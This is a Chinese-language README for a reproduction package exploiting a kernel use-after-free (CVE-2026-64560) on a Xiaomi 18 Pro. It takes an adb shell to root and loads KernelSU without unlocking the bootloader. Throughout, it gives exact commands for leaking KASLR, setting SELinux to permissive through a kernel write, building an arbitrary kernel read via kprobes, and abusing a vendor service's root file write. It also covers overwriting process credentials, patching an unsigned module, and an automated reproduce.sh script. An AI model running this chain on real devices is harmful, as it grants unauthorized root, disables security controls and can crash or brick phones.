# CVE-2026-64560 完整链路包 —— 免解锁 Bootloader 临时 root（KernelSU LKM）

> **性质**：本人设备（Xiaomi 18 Pro / `M610BB`）上的安全研究复现包。
> **不做的事**：不写/不改任何分区，不碰 bootloader 与 `apdp/msadp`，不产出"一键解锁"工具，
> 不使用需要用户点击的 App 侧链路。
> **只在你拥有或获得书面授权的设备上使用。** 代码会以内核态写内存，**有概率直接把手机跑崩**（见 §7）。

## 1. 这个包能做什么（实测结果）

| 项 | 值 |
|---|---|
| 起点 | `adb shell` → `uid=2000(shell)`、`CapEff=0`、`CapBnd=0x8000c0`、SELinux `Enforcing` |
| 终点 | 同一进程 `CapEff=0xffffff8840afc7c0`（含 `CAP_SYS_MODULE` / `CAP_SYS_ADMIN` / `CAP_SETUID` / `CAP_SYS_PTRACE`），`uid=0` |
| LKM | `kernelsu 192512 1 - Live 0xffffffec75c14000 (O)` |
| 用户态 | `ksud install` 成功，`/data/adb/ksu/bin/{su,ksud,busybox}` 就位 |
| 分区改动 | **无**。重启即完全回到原状 |
| 单次 attempt 命中率 | 2~3%（每 attempt ≈ 5.1 s） |
| 完整一轮（两个写阶段） | 10~20 min |
| 端到端成功率 | **≈ 50%**（含被主动放弃的无效轮次）；最近一次成功见 §12 |

**结论先说**：这条链能打通，但**不适合无人值守反复跑**。一次落地成功就立刻收手。

## 2. 目标环境（缺一项都不要往下走）

```
机型         Xiaomi 18 Pro  (hongkong / M610BB / SM8950)
系统         Android 17，user build，OS4.0.9.0，安全补丁 2026-09-01

```

必须同时成立的内核/系统条件（本包所有设计都建立在它们之上）：

| 条件 | 本机实测 | 影响 |
|---|---|---|
| `CONFIG_MODULE_SIG_FORCE` 未设 | ✅ | 未签名 LKM 可加载 |
| `CONFIG_MODULE_FORCE_LOAD` 未设 | ✅ | 所以**必须**改 vermagic（不能 `IGNORE_VERMAGIC`） |
| `__versions` 段为空 | ✅ | modversions 不拦 |
| `CONFIG_STATIC_USERMODEHELPER=y` + `PATH=""` | ✅ | `core_pattern`/`modprobe_path` 全废 ⇒ 只能走 LKM |
| `CONFIG_RANDOMIZE_BASE=y` / `RANDOMIZE_MEMORY` 未设 | ✅ | 有内核文本 KASLR，但 linear map/vmalloc 固定 |
| `posix_timers_cache` 为专用 cache（无 `SLAB_MERGE_DEFAULT`） | ✅ | 只能做**页级** cross-cache（8KB frag） |
| `CFI=y`、`SHADOW_CALL_STACK=y`、`LIST_HARDENED=y` | ✅ | 只能做**数据攻击**，不能劫持控制流 |
| shell 在 `readtracefs(3012)` 组 | ✅ | 可读 `per_cpu/*/trace_pipe_raw`（KASLR 泄漏的前提）|

**同版本 `vmlinux.elf` 是硬依赖**：`ksu/vmlinux.elf` 必须与目标设备内核完全同版本，
否则 `slide` 推导与所有符号地址全是错的。

## 5. 复现步骤（按顺序，一步都不要跳）

> 下面统一用 `T=/data/local/tmp`，`$` 开头是主机命令，`#` 开头是设备内命令。
> **每一步都有验收判据，判据不过就不要进下一步。**

### 步骤 0 — 确认起点

```bash
adb shell "id; cat /sys/fs/selinux/enforce; cat /proc/sys/kernel/kptr_restrict 2>/dev/null"
```

期望：`uid=2000(shell)`、`enforce` = `1`、`CapEff`（`/proc/self/status`）为 `0`。
如果设备刚被跑崩重启过，先重新执行 `./device/deploy.sh`（`/data` 是 f2fs，崩后丢写）。

### 步骤 1 — 取本次启动的 KASLR slide（≈40 s）

```bash
adb push src/kprobe/grab_blocked.sh $T/
adb shell sh $T/grab_blocked.sh
mkdir -p out/blocked
for c in 0 1 2 3 4 5 6 7; do adb pull $T/bl_$c.bin out/blocked/ ; done
adb pull $T/bl_text.txt out/blocked/          # ★ 锚定法必需
python tools/slide_now.py out/blocked
```

期望输出：

```
[+] 锚定法：4 组 (观测值, 锚点) 指向同一个 slide
slide = 0x2b1f000000   (_text = 0xffffffeb9f000000)
   0xffffffeb9f1270c0 x2231   -> worker_thread+0x260
   0xffffffeb9f1df640 x911    -> rcu_gp_fqs_loop+0x1dc
   0xffffffeb9f282214 x891    -> tracing_mark_write+0x94
   0xffffffeb9f3925b0 x428    -> folio_wait_bit_common+0x270
selinux_state = 0xffffffeba1918630
[+] 已写入 out/blocked/slide_current.txt
```

**为什么这里不会选错**：`grab_blocked.sh` 同时留下两份数据 —— raw（裸 64 位地址）和
`bl_text.txt`（`%pS` 符号名）。工具从文本里取最常见的 `caller=<name>+0x<off>` 锚点，
与 raw 里最常见的高计数地址配对解 `slide = V - link(name) - off`，取众数。
两份数据出自同一次抓取，所以解是唯一的。

**仍要人工扫一眼**：正确 slide 下，前面的高计数行必须是 `worker_thread` /
`rcu_gp_fqs_loop` / `tracing_mark_write` / `folio_wait_bit_common` 这类"到处都在阻塞"的函数。
如果看到 `wacom_wac_irq`、`mmc_io_rw_extended` 这种，说明锚点被污染了，用 `--check` 手工核对：

```bash
python tools/slide_now.py --check 0x2b1f000000 out/blocked
```

拿到 slide 后，记下 `selinux_state` 的绝对地址（脚本已直接打印，别手算 —— 这个数常被算错）。

### 步骤 2 — 把 SELinux 置为 **permissive**（v36，两步）

> ⚠ **不要用 v33 的"清零 8 字节"**。那会把 `enforcing` 和 `initialized` 一起清 0，
> 等于 SELinux 完全停用：`setcon()` 全部失败 ⇒ **多数 App 起不来，KernelSU 管理器点开即崩**。
> 正确目标是 permissive（`enforcing=0` 但 `initialized=1`），等价 `setenforce 0`。

`selinux_state` 布局（BTF 实测）：`enforcing@+0x00`、`initialized@+0x01`、`policycap@+0x02`。
紧邻它前面的 8 字节是 `avc_latest_notif_update.notif_lock`（未持锁时为 0，已实测确认）。

#### 推荐：单步（只赌一次）

```
# *(state-7) = 0  → 覆盖 [state-7 .. state]：notif_lock 尾部(本来就是0) + enforcing=0
#                    initialized / policycap 完全不动 ⇒ 直接得到 permissive
/data/local/tmp/t64560_v36 0 <selinux_state - 7>    150 400 16 6000 12000
#                ↑pc ↑目标                          ↑attempts ↑timers ↑victims ↑nfrag ↑drain_ms
```

落地后打印 `STEP_OK ...` **并立即退出**（落地即停，少一次崩溃机会）。
**一次写就把 SELinux 变成 permissive**，比两步少一半暴露面。

#### 回退：两步（只用于"已经变成 disabled"的情况）

```
/data/local/tmp/t64560_v36 0 <selinux_state>        150 400 16 6000 12000   # 清 enforcing
/data/local/tmp/t64560_v36 1 <selinux_state + 1>    150 400 16 6000 12000   # 恢复 initialized
```

**验收判据**（`rd5.sh` 是任意读，permissive 前后都能用）：

```bash
adb shell 'cat /sys/fs/selinux/enforce'                 # 0
adb shell 'sh /data/local/tmp/rd5.sh <state>'           # 期望低 16 位 = 0x0100
adb shell 'id'                                          # context=u:r:shell:s0（不是 kernel）
```

`id` 里 `context=kernel` ⇒ 还是 disabled（`initialized=0`）；`u:r:shell:s0` ⇒ permissive 生效。

> 想先确认"能不能夺页"而不写任何东西，用 `t64560_v27 800 400 16 6000 12000`
> （同一个落地配方，只观测 `LEAK`，没有目标地址参数）。
> 旧版 `t64560_v33 <attempts> ... <target>` 仍可用，但它只会写 0（=disabled），**不推荐**。

### 步骤 3 — 建 kprobe：拿到"任意内核 8 字节读"与"任意进程 cred"

```
# 关掉 SELinux 之后，kprobe_events(0777) 可写
echo 'p:fbc/comm __set_task_comm task=%x0 real=+0x900(%x0) cred=+0x908(%x0)' \
     >> /sys/kernel/tracing/kprobe_events

# enable 是 -rw-r----- root:readtracefs，DAC 挡住 shell
# 用 code 7（IMQSNative 的 root 任意写）把它打开
CLASSPATH=/data/local/tmp/caplog.jar app_process64 /system/bin CapLog \
    miui.mqsas.IMQSNative 7 /sys/kernel/tracing/events/fbc/comm/enable '1'

echo 1 > /sys/kernel/tracing/tracing_on
echo MARKER > /proc/self/comm          # 触发一次
tail -1 /sys/kernel/tracing/trace
```

**验收判据**：

```
 MARKER-2439 [001] d.... 2439.196570: comm: (__set_task_comm+0x0/0x100) \
     task=0xffffff8947461680 real=0xffffff880d479540 cred=0xffffff880d479540
```

`%x0` 打印的是**裸指针，不走 `hash-ptr`**。这是整条链的转折点。

任意读（每次用唯一事件名，避免 enable 复用问题）：

```bash
adb push src/kprobe/rd.sh $T/ && adb shell chmod 755 $T/rd.sh
adb shell $T/rd.sh 0xffffffec7a892a50      # 例：init_cred.cap_effective
# → val: (__set_task_comm+0x0/0x100) v0=0x1ffffffffff
```

### 步骤 4 — 起候选进程，挑一个 `bit16=1` 的

```
/data/local/tmp/cand.sh 8
```

输出每个候选的 `task / real_cred / cred`。**自己算**：

```
可用 ⇔ ((cred + 0x40) >> 16) & 1 == 1        # bit16 = CAP_SYS_MODULE
加分 ⇔ ((cred + 0x40) >> 7)  & 1 == 1        # bit7  = CAP_SETUID（能直接 setresuid(0,0,0)）
```

（`cap_effective` 会被写成 `cred+0x40` 这个地址值，所以能力位就是这个地址的低位。
`bit16` 约 1/2 概率，起 8 个基本必有一个。）

### 步骤 5 — 两阶段写：把 candidate 的 `CapEff` 变成能力集（10~20 min）

```
/data/local/tmp/t64560_v40 <cred> 200 200 400 16 6000 12000 4500
#                          ↑cred ↑att1 ↑att2 ↑timers ↑victims ↑nfrag ↑drain_ms ↑min_drain_ms
```

* `att1`：阶段 1（清 `cap_bset`）的最大 attempt 数；
* `att2`：阶段 2（写 `cap_effective`）的最大 attempt 数；
* **最后一个 `4500` 是 `min_drain`，必须给**：定时器页回到 buddy 需要时间，
  没有它的话脏基线会让排空门瞬间通过（`drained=1(103ms)`），frag 喷太早 ⇒ 永远零命中。
* 每 attempt ≈ 5.1 s。

成功时程序（其实是**候选进程自己**）会做三件事：

1. 写 `/data/local/tmp/ROOTED`（含 `CapEff`、`setresuid` 返回值）；
2. `setresgid/setresuid(0,0,0)`（只有含 `CAP_SETUID` 的 cred 才行）；
3. 自动 `delete_module("kernelsu")` + `finit_module(/data/local/tmp/ksu-patched.ko, "allow_shell=1")`。

**验收判据**：

```
cat /data/local/tmp/ROOTED
# pid=… CapEff=0xffffff8055ad84c0 setresgid=-1 setresuid=0 uid=0 euid=0
cat /data/local/tmp/KSU_RESULT
# reload: delete_module rc=-1 errno=2(No such file or directory) ; finit_module(allow_shell=1) rc=0
grep kernelsu /proc/modules
# kernelsu 192512 1 - Live 0xffffffec75c14000 (O)
```

> **看到 `ROOTED` 就立刻停手**，不要再跑一轮。重复触发只会增加延迟崩溃概率。

> ⚠ **`setresgid` 成功的 cred 会让候选变成 `uid=0 gid=0`**。`/data/local/tmp` 是
> `drwxrwx--x shell:shell`，gid 变 0 之后**写不进去**（uid 0 但没有 `CAP_DAC_OVERRIDE`，
> 因为 bit1 由地址决定，通常没开），表现是：`ROOTED`/`KSU_RESULT` 都不出现、`DOLOAD`
> 不被消费，看起来像卡死。**开跑前先 `adb shell chmod 777 /data/local/tmp`** 即可。
> 本轮实测就是这么卡了一次（见 §13）。

### 步骤 6 — 修补 LKM（可以提前在主机上做好，与步骤 1~5 并行）

```bash
# 6.1 vermagic
python tools/ko_vermagic.py ksu/ksu-v3.3.1-a17-6.18.ko out/ksu-v.ko
#   old vermagic: 6.18.32-4k-g47cc22554442-dirty …
#   new vermagic: 6.18.21-android17-5-g1d099fcb35e0-abogki540753930-4k SMP preempt mod_unload modversions aarch64

# 6.2 225 个未导出符号 → SHN_ABS + 绝对地址
#     需要「本次启动」的 kallsyms。两条路，任选一条：
#
#   (a) 设备上还能读到（SELinux 关掉 + kptr_restrict=0 之后 shell 可读）
adb shell cat /proc/kallsyms > evidence/kallsyms_now.txt
#
#   (b) 读不到时，用 vmlinux.elf + 当前 slide 直接合成（**重启后必须用这条**）
python tools/mk_kallsyms.py ksu/vmlinux.elf 0x2a67c00000 out/kallsyms_now.txt

python tools/ko_patchsyms.py out/ksu-v.ko out/ksu-patched.ko out/kallsyms_now.txt
# → patched 225 undefined symbols -> SHN_ABS
```

`ko_patchsyms.py` 的原理：内核 `simplify_symbols()` 对 `st_shndx == SHN_ABS` 的符号直接
`break`（用 `st_value` 当绝对地址），只有 `SHN_UNDEF` 才去 `ksymtab` 按名字找导出符号。
把 225 个 `SHN_UNDEF` 改成 `SHN_ABS`，未导出符号就都能解析了。

> ★ **绝对地址绑定"当次启动"**。重启后 slide 变了，旧 ko 的 225 个地址全部错位，
> `finit_module` 会返回 **`ENOENT`**（dmesg 里是 `Unresolved symbol xxx`）——不是 vermagic 问题，
> 是符号地址问题。此时用 `mk_kallsyms.py <vmlinux> <新 slide>` 重新合成再 patch 即可。
> 本包 `ksu/ksu-patched.ko` 是按 2026-10-18 那次启动的 slide 打的，**换启动就不要直接用**。

### 步骤 7 — 装 KernelSU 用户态

```bash
# uid 0 下（步骤 5 的候选进程可以代跑：把命令写进 $T/CMD）
adb shell 'echo "/data/local/tmp/ksud install" > /data/local/tmp/CMD'
adb shell 'cat /data/local/tmp/rsh.out'

ls -l /data/adb /data/adb/ksu/bin
# /data/adb/ksu/bin/{busybox, bootctl, su -> ksud, ksud -> /data/adb/ksud, resetprop -> ksud}
grep kernelsu /proc/modules
# kernelsu 192512 1 - Live …        ← refcount 0 → 1
```

`su` 对普通 shell 生效需要模块以 `allow_shell=1` 加载（`t64560_v34` 的
`reload_ksu_with_allow_shell()` 已经这么做）。**注意用裸 `su`，不要写全路径** ——
`/data/adb` 是 `0700 root:root`，shell 连目录都进不去；KernelSU 的 `execveat` 钩子
会在路径解析前拦截名字为 `su` 的 exec：

```bash
adb shell 'su -c id'
# uid=0(root) gid=0(root) groups=0(root) context=kernel
```

（`/data/adb/ksu/bin/su` 只有 uid 0 才能直接调用；从 shell 直接写全路径会
`inaccessible or not found`，这不是故障。）

### 根命令执行器（候选进程活着时最好用）

```bash
adb shell 'echo "id; grep kernelsu /proc/modules" > /data/local/tmp/CMD'
adb shell 'cat /data/local/tmp/rsh.out'
```

候选进程（父）**不 exec**，所以一直持有能力；它 `fork` 出子进程跑 `sh CMD.run`，
子进程继承 uid 0。父进程死了这个通道就没了 —— 它是你唯一能反复用的 root 入口。

## 6. 工作原理（一句话版，细节见 `docs/00-链路总览.md`）

1. **漏洞**：`posix_cpu_timer_del()` 在 `lock_task_sighand()` 返回 NULL 时直接
   `return 0`，没把 `k_itimer` 从 `signal->cputimer` 红黑树摘下来；对象随后被释放，
   `it.cpu.node` 成了**悬空 rb_node**。修于 6.18.41，本机未回移。
2. **触发**：**父进程**用 `timer_create(((~(pid))<<3)|CPUCLOCK_SCHED)` 给**子进程**建计时器
   （arm **3600 s**），子进程的**非 leader 线程** `execv`，父进程 4 线程删除风暴；
   真正的触发点是 victim **退出**时的 `cleanup_timers() → timerqueue_del()`。
3. **夺页**：`posix_timers_cache` 是 order-1（384B×21，步进 `0x180`）。
   喷 6000 个 **8 KB AF_UNIX frag**：`alloc_skb_with_frags` 在 `size=8192` 时走
   `__alloc_pages(order=1)`，8192 字节**逐字节可控**且随 socket 常驻。
4. **写原语**：伪造 `rb_node` 的 `parent_color / rb_right / rb_left`，
   `__rb_erase_augmented` 只有两种能安全收尾的形状（零写 / 指针写），见总览 §3。
5. **从零写升级到"能力集"**：先把 `cred+0x48`（`cap_bset`）清 0，再把 `cred+0x40`
   （`cap_effective`）写成 `cred+0x40` 这个地址值本身。

## 7. 注意事项（**这一节比命令更重要**）

### 7.1 会把设备跑崩的地方

1. **端到端成功率只有 ≈50%**。4 次完整运行：2 次成功、1 次延迟 kpanic、1 次冷启动重跑失败。
   kpanic 现场是 `fsnotify_mark_destroy_workfn` 读到 `0xfffffffffffffffc` ——
   不是立刻崩，而是**写落到了别人的对象上**、之后被 kworker 撞到。
   所以"跑完看起来没事"不等于"没破坏东西"。
2. **一次落地立刻收手。** 不要"再跑几轮提高概率"——重复触发就是在重复掷骰子。
3. **落地判据不能只看"页内出现内核指针差异"**。误判会把 `P->rb_right = T` 写进别人的对象。
   收紧后的判据：`(val & 0x1fff) == off && (off % 0x180) == 0xe0`。
   进阶段 2 之前**必须**用 `rd.sh <cred>+0x48` 回读，确认阶段 1 真的写了 0。
4. **阶段 2 的 `parent` 最好指向本页的另一个槽位**（而不是页首），减少对页首布局的依赖。

### 7.2 触发/参数类

5. **计时器必须 arm 3600 s**。100 ms 会在 `exec` 之前正常到期并被摘掉，竞态直接消失。
   这是早期版本零命中的最大原因。
6. **触发点是 victim 退出，不是到期。** 依赖 `posix_cpu_timers_exit_group` →
   `cleanup_timers` → `timerqueue_del`；写成"等到期"永远不命中。
7. **`--victim-child` 不能读父进程的 mmap 共享内存**：`execv` 之后那是野指针（SIGSEGV）。
8. **必须用 8 KB frag，不能换成 kmalloc**：`kmalloc-8k` 实测 per=4 / pages=8（order-3），
   与 order-1 目标页阶不符，cross-cache 走不通。
9. **落地后等 `posix_timers_cache` 回落**：轮询 `/proc/slabinfo` 到
   `active` 回到基线 +64 左右再喷 frag（实测 1.2~8.1 s）。喷早了等于没喷。
10. **扫描前先等 RCU grace**：`free_pid` 走 `call_rcu`。`wait=0` 时页不动，
    `200 ms` ≈ 130 页，`12000 children + 500 ms` ≈ 237 页（最优）。

### 7.3 环境类

11. **KASLR slide 每次启动都重新随机**（实测 `0x2993400000` / `0x1C4A200000` / `0x2B1F000000`），
    崩溃日志里的 `Kernel Offset` **不能跨启动复用**。重启后必须重跑步骤 1。
    注意 slide 可以大于 4 GB（`0x2B1F000000` ≈ 185 GB），任何 `1<<32` 的边界判断都是错的。
12. **`vmlinux.elf` 必须同版本**，否则 slide 与符号全错。
    `selinux_state` 的链接地址（`0xffffffc082918630`）也是**这台机器这个内核**的值，
    换固件/换版本必须从 `vmlinux.elf` 的 `.symtab` 重新取。
13. **`/data` 是 f2fs，崩溃后会丢写**：设备 kpanic 重启后 `/data/local/tmp` 里的工具可能不全，
    重新 `./device/deploy.sh`。
14. **`exec` 之后 `CapEff` 会变 0**：阶段 1 把 `cap_bset` 清 0 了，`cap_bprm_creds_from_file`
    算出的 `pP' = fP & pB = 0`。所以 `finit_module`、`mount` 这类需要能力的操作**只能由
    未 exec 的候选进程本身做**。uid 0 + SELinux 未初始化仍然是可用的 root，只是不带 cap。
15. **KernelSU 加载后 `getenforce` 会"回弹"报 `Enforcing`**，但 `selinux_state.initialized`
    仍是 0，所有 hook 依然早退 —— kprobe/写 tracefs 继续可用。别被 `getenforce` 骗了。
16. **不要重启**：整条链的所有地址（slide、cred、kallsyms、`selinux_state`）都绑定当前启动。
17. **`ksu-patched.ko` 必须在 `/data/local/tmp`**：`t64560_v34` 的重载路径写死了这个位置。

### 7.4 纪律类

18. **绝不写引导分区 / 绝不 `flashDebugPolicy`**：`code 12 flashDebugPolicy` 会 `dd` 写
    `apdp/msadp`，那是不可逆的。
19. **崩溃不是"失败"，是数据**：跑崩了先 `adb bugreport` 拿
    `FS/data/miuilog/stability/reboot/-1_ke_<dgt>.zip`（打包是异步的，等 ≥5 min），
    里面 `temp/last_kmsg` 才是真正的原因。
20. 这台机器 `hungtask.panic=true`、`panic_on_rcu_stall=1`，任何内核卡死都会直接变成 panic。
21. **★ 别让系统"太闲"**：实测同样的二进制、同样的参数，
    **8 个候选进程在场时阶段 1 第 10 次就落地；把候选全杀光只剩一个 v34 时，212 次 attempt 零命中**。
    这个竞态需要调度抖动 —— 保持那 8 个候选进程活着（它们本身只做 100 ms 一次 `capget`），
    或者另起几个 `forker` 制造负载。**"零命中"先怀疑环境太静，而不是参数不对。**
22. **★ 拿到 root 之后立刻清理现场**：`pkill t64560_*`、删掉 `/data/local/tmp` 里的日志与
    frag socket、关掉仍在轮询的候选进程。**留着它们继续跑 = 持续赌崩溃**。
23. **不要让它无人值守地跑**。这台机器出现过"崩溃后无法自动重启、必须进 fastboot 才能开机"
    的情况（`result_reason` 里是 `kernel poweroff: ps_hold` + 时间戳回到 1970，说明是
    早期启动阶段的异常关机）。跑之前保证电量 >50%，人要在场。
24. **★ `posix_timers_cache` 基线必须是"干净的"**。每轮落地都会在 cache 里留下永久泄漏的
    对象，实测：新启动 `441` 个对象（21 slab），跑过一轮后变成 `630`（30 slab）**且不回落**。
    基线被抬高有两个后果：
    * 严格门 `act <= base+64` 会**瞬间满足**（日志里 `drained=1(103ms)`），frag 在 victim 的
      计时器页还没回到 buddy 时就喷出去 ⇒ 必然零命中；v36 因此加了 `min_drain`（默认 4500 ms）。
    * 页级重占的成功率被结构性拉低（可回收页变少）。
    **对策：一旦某一步反复零命中（>150 次），重启设备重来**，不要硬耗。
25. **victims 调到 24、timers 调到 600**（`t64560_v36 <pc> <T> 200 600 24 6000 12000 4500`）
    能把每次 attempt 的并发竞态窗口拉长，实测比 16×400 更容易命中。

## 8. 失败处理与回滚

| 现象 | 处理 |
|---|---|
| 阶段 1 跑了 `att1` 次没有 `LEAK` | 正常（2~3%/attempt）。加大 `att1`，或换一个候选进程重来 |
| 阶段 2 kpanic、设备重启 | **不要立刻重跑**。先取 `bugreport` 的 ke 包分析；重启后一切归零（无分区改动） |
| `finit_module` 返回 `ENOENT` | 符号没补全 —— dmesg 里会有 `Unresolved symbol xxx`，重新跑 `ko_patchsyms.py` |
| `finit_module` 返回 `EINVAL` | vermagic 没改对，或 `.modinfo` 的 `sh_offset/sh_size` 没指向新串 |
| `su -c id` 仍是 uid 2000 | 模块加载时没带 `allow_shell=1`，让候选进程重载一次 |
| `cand.sh` 全是 `NOLINE` | kprobe 没 enable，或 `tracing_on=0`，回步骤 3 |

**回滚 = 重启**。本链全程不写任何分区，`kernelsu` 模块也在内存里，重启自然消失，
`/data/adb` 里的 KernelSU 用户态文件可以手动删掉（不影响系统）。

## 13. 为什么管理器显示「未安装」、也没有「越狱模式」徽标

**先给结论：内核侧确实处于 late-load 模式，缺的是"管理器加冕"这一步。**

内核自报状态（用 root 跑 `ksud debug info`）：

```
version: 32680        uapi_version: 5
lkm: true             bundled: false
late_load: true       runtime_mode: late-load      ← 内核认为自己是越狱/late-load 模式
```

但管理器 UI 里那张卡仍是「未安装」，也没有模式徽标。原因是管理器的所有信息都来自
JNI（`libkernelsu.so` → 扫 `/proc/self/fd` 找 **ksu fd** + `prctl`），而内核**只给"被加冕的
管理器进程"装这个 fd**。加冕由 `track_throne()` 完成：

```c
track_throne():                                   // 内核 init 里调用一次，之后包变化时再调
  filp_open("/data/system/packages.list")         // ← 这里失败了
  → 找到 me.weishu.kernelsu 的 uid
  → search_manager("/data/app", 2) 扫 base.apk
  → is_manager_apk() 验签 → crown_manager() → ksu_set_manager_appid()
```

本机实测的内核日志：

```
[ 1051.499963] KernelSU: track_throne: open /data/system/packages.list failed: -13
[ 1307.538511] KernelSU: track_throne: open /data/system/packages.list failed: -13
```

`-13 = EACCES`。而该文件是：

```
-rw-r----- 1 system package_info  u:object_r:packages_list_file:s0  /data/system/packages.list
```

**根因**：`track_throne` 用的是 `override_creds(ksu_cred)`，而 `ksu_cred` 是在
`kernelsu_init()` 开头用 `prepare_creds()` **从"加载模块的那个进程"复制**来的。
我们这条链的加载进程，`cap_effective` 被写成了「`cred+0x40` 这个地址本身」——
地址是 8 字节对齐的，**bit1（`CAP_DAC_OVERRIDE`）永远是 0**，所以它读不了 0640 的
`packages.list`（owner 是 `system`，不是 root）。

于是：**没有加冕 → 没有 ksu fd → JNI 全部返回 0 → UI 显示「未安装」→ 自然也没有「越狱模式」徽标。**
`su` 本身不受影响（`su -c id` → `uid=0, context=u:r:ksu:s0`），模块功能也正常，
只是管理器看不到、也因此无法用 UI 授权/装模块。

### 13.1 官方（Magica）流程为什么没这个问题

`ksud late-load` 是在**已经被授予 root、带全能力**的进程里跑 `finit_module` 的，
`prepare_creds()` 复制到的是全能力 cred（含 `CAP_DAC_OVERRIDE`），所以 `track_throne`
能读 `packages.list`，管理器随即被加冕。

### 13.2 已验证/未验证的规避手段

| 手段 | 结果 |
|---|---|
| 直接 `chmod 644 /data/system/packages.list` 再触发包事件 | 失败：system_server 会原子重写该文件，权限被重置回 0640 |
| `bind mount` 一个 0644 副本上去 + 触发包事件 | 文件已可读（`ls -l` 显示 0644），但**包事件没有再触发 `track_throne`**（root 装/卸都不触发，shell 装又被 MIUI 拦），所以没能验证到加冕 |
| `setenforce 0` 后再试 | 仍然 `-13` ⇒ 证明是 **DAC**，不是 SELinux |
| 重启模块（unload + load） | `ksud unload` 会**把设备直接带重启**（实测一次），不要随便用 |

**结论**：想让它自识别，必须让**加载模块的那个进程带 `CAP_DAC_OVERRIDE`**（或让
`packages.list` 在 init 那一刻可读）。我们这条链的能力位是"地址派生"的，取不到 bit1，
所以**在现有链路上管理器注定显示未安装**——这不是故障，是能力位与内核检测路径的结构性冲突。

### 13.3 推荐的绕过流程（`t64560_v42` 已内置开关）

思路：**别让 phase 2 之后自动加载 ko**，先拿到 root，把 `packages.list` 变成可读，
再手动触发加载 —— 这样 init 里的 `track_throne()` 就能读到包列表并加冕管理器。

```
# 1) 开跑前放一个开关文件，让 v42 拿到能力后"先不加载"模块
adb shell 'touch /data/local/tmp/NOLOAD'

# 2) 正常跑两阶段（permissive 那步照旧）
adb shell 'sh /data/local/tmp/l42.sh <cred>'

# 3) 看到 /data/local/tmp/ROOTED 之后：用 root 会话把包列表放开
adb shell 'su -c "chmod 644 /data/system/packages.list"'    # 或者 bind mount 一个 0644 副本

# 4) 去掉开关，触发加载（v42 的 DOLOAD 分支）
adb shell 'rm -f /data/local/tmp/NOLOAD; touch /data/local/tmp/DOLOAD'

# 5) 内核 init 里的 track_throne() 现在能读到 packages.list → 加冕管理器
adb shell 'su -c "dmesg | grep -E "Crowning|Searching manager|is_manager""'
# 期望看到：Searching manager me.weishu.kernelsu... / Found manager base.apk ... is_manager: 1 / Crowning manager: uid=10xxx

# 6) 重启管理器，UI 应显示已安装 + 越狱(late-load)模式
adb shell 'am force-stop me.weishu.kernelsu; am start -n me.weishu.kernelsu/.ui.MainActivity'
```

注意：第 3 步的 chmod 会被 system_server 在**下一次包变更**时重写回 0640，
所以第 3、4 步之间不要装/卸任何 App。`bind mount` 方式更稳（写入会落到副本上，权限保持 0644）。

> 这条流程是本轮诊断得出的**待实机验证**方案（诊断本身有源码 + 内核日志双重依据）；
> 第 4 步的 `DOLOAD` 路径在之前的运行中已验证可用。

### 13.3 顺带确认的两个"假故障"

* `/sys/module/kernelsu` **不存在是正常的**：KernelSU 在非 `CONFIG_KSU_DEBUG` 构建里会
  `kobject_del(&THIS_MODULE->mkobj.kobj)` 主动摘掉自己的 sysfs 节点（反检测）。
* 模块加载后 `getenforce` 回弹成 `Enforcing` 也是正常的：late-load 分支里写着
  `if (!getenforce()) { pr_info("Permissive SELinux, enforcing\n"); setenforce(true); }`。
  这也再次说明 **`initialized=1` 才是关键**，`enforcing` 是 0 还是 1 系统都正常。

## 14. 一条命令复现：`reproduce.sh`

手工按 §7 走一遍要人盯 30~60 分钟，而且**阈值判断只能靠人**。`reproduce.sh` 把整条链
做成状态机，自己重启、自己重试、自己判据。

```bash
./reproduce.sh                 # 默认最多 3 个 boot
./reproduce.sh --boots 5       # 最多重启 5 次
./reproduce.sh --no-reboot     # 不重启，在当前 boot 上跑（调试）
./reproduce.sh --check         # 只检查环境 + 推静态件，不动漏洞
./reproduce.sh --perm-max 40 --cred-max 150
```

入口是 bash（只负责找 `adb` / `python`），状态机在 `tools/reproduce.py`。

### 每个 boot 的流程

| 阶段 | 做什么 | 判据 |
|---|---|---|
| 0 | `adb reboot` → 等 `sys.boot_completed` → 等 12 s | — |
| 1 | `grab.sh` + `slide_now.py` 反推 slide | 3 组以上锚点一致 |
| 2 | `mk_kallsyms` + `ko_vermagic` + `ko_patchsyms` → `next-now.ko` | `patched 227` |
| 3 | `t64560_perm 0 (state-7) 50 400 16 6000 12000 4500` | `STEP_OK` 且 `enforce=0` |
| 4 | `kp.sh` 建 `__set_task_comm` 探针 | `add_rc=0` + `enable=1` |
| 5 | 起 8 个候选 → 读 cred → 选 bit16/bit7 都是 1 的 | `cred=0x…` |
| 6 | `t64560_v42 <cred>` 两阶段（带 `NOLOAD`） | `/data/local/tmp/ROOTED` |
| 7 | 候选进程跑 `CMD`：`insmod next-now.ko allow_shell=1` + `ksud_next install` | `/proc/modules` 有 `kernelsu` |
| 8 | `su -c crown.sh`：`chown root:root` + `chmod 644` packages.list，再 `pm install -r` 触发 | dmesg `Crowning manager` |

### 两条阈值（都是为了绕开"脏 cache"）

* **permissive 超过 50 次没落地 ⇒ 直接重启重来**。它一落地就会永久泄漏
  `posix_timers_cache` 对象，同一 boot 上的后续落地概率会塌方（实测：15 次落地后
  cred 阶段 10 次就中；153 次落地后 cred 阶段 251 次 0 命中）。
* **cred 每阶段超过 180 次没落地 ⇒ 重启重来**。

### 为什么不用 `rmmod` 换模块

这台机器上 `rmmod kernelsu` / `ksud unload` **必崩**（各实测一次，直接重启）。
两个 ko 的 `name` 都是 `kernelsu`，不能共存。所以脚本的策略是：**在一个"内核里没有任何
KSU 模块"的 boot 上，直接用候选进程（uid 0 + `CAP_SYS_MODULE`）`insmod` 目标 ko** ——
全程不卸载任何模块。

### 日志

`out/reproduce_<时间戳>.log` 是完整时间线；设备端分阶段日志在
`/data/local/tmp/{perm,cred}.log`、`rsh.out`、`ROOTED`。
